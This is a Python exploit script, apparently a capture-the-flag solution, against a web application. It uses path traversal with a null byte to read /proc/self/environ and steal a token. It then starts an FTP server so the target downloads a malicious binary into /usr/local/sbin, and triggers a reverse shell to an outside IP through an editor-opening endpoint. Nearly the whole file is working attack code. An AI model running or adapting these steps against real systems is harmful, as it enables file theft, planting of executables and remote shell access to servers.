from time import sleep
from urllib.parse import quote_plus
import httpx
import json
from multiprocessing import Process
import re

LPORT = 4444
LHOST = "172.17.0.1"
URL = "http://localhost:80"

print("LHOST:", LHOST)

def ftp_server(port):
    from pyftpdlib.authorizers import DummyAuthorizer
    from pyftpdlib.handlers import FTPHandler
    from pyftpdlib.servers import FTPServer

    authorizer = DummyAuthorizer()
    authorizer.add_anonymous(".")
    handler = FTPHandler
    handler.authorizer = authorizer
    server = FTPServer(("0.0.0.0", port), handler)
    server.serve_forever()


class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)


class API(BaseAPI):
    def post(s, url):
        return s.c.post("/", data="url="+url)

    def assets(s, file):
        file = quote_plus(file)
        return s.c.get(f"/assets/{file}")

    def open_editor(s, cmd):
        cmd = quote_plus(cmd)
        return s.c.get("/src:/"+cmd, headers={
            "open-in-editor": "1"
        })


if __name__ == "__main__":
    cmd = "sh -i >& /dev/tcp/108.137.37.157/4444 0>&1"
    api = API()
    # get hacker token
    res = api.assets("../../../../../../../../../proc/self/environ\0.js")
    print(res.text)
    hacker_token = re.search('(?<=Hacker_Token=).*', res.text, re.ASCII).group(0).split("\x00", 1)[0]
    proc = Process(target=ftp_server, args=(LPORT,))
    proc.start()
    sleep(3)

    # upload malciaus code editor
    payload = json.dumps([f"ftp://{LHOST}:{LPORT}/subl", "--preserve-permissions", "-O", "/usr/local/sbin/subl"])
    print(payload)
    api.c.headers.update({"Hacker-Token": hacker_token})
    res = api.post('data:,'+payload)
    print(res.text)

    # CMD
    res  = api.open_editor(cmd)
    print(res.text)
